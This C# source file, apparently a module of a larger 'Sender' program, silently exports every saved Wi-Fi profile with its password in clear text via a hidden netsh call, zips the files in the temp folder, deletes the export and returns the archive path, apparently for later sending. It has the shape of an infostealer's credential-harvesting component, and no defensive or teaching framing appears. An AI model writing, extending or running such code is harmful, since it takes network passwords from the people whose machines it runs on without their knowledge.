using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Sender
{
    internal class SenderWiFi
    {
        public static string PackageWiFiProfiles(CancellationToken cancellationToken)
        {
            string wiFiProfiles = GetWiFiExportPath();

            Console.WriteLine(wiFiProfiles);

            string tempWiFiZipFolder = Path.Combine(Path.GetTempPath(), "WiFiProfileFolder.zip");
            if (File.Exists(tempWiFiZipFolder)) File.Delete(tempWiFiZipFolder);

            using var archive = ZipFile.Open(tempWiFiZipFolder, ZipArchiveMode.Create);
            if (Directory.Exists(wiFiProfiles))
            {
                Console.WriteLine(wiFiProfiles);
                SenderUserFiles.AddDirectoryToZip(archive, wiFiProfiles, Path.GetFileName(wiFiProfiles), cancellationToken);
            }

            Directory.Delete(wiFiProfiles, true);

            return tempWiFiZipFolder;
        }
    
        private static string GetWiFiExportPath()
        {
            string tempExportFolder = Path.Combine(Path.GetTempPath(), "WiFiProfiles");
            if (Directory.Exists(tempExportFolder)) Directory.Delete(tempExportFolder, true);
            Directory.CreateDirectory(tempExportFolder);

            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "netsh",
                    Arguments = $"wlan export profile folder=\"{tempExportFolder}\" key=clear",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }
            };

            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();

            Console.WriteLine(output);
            Console.WriteLine("Wi-Fi profiles exported to: " + tempExportFolder);

            return tempExportFolder;
        }

    }
}
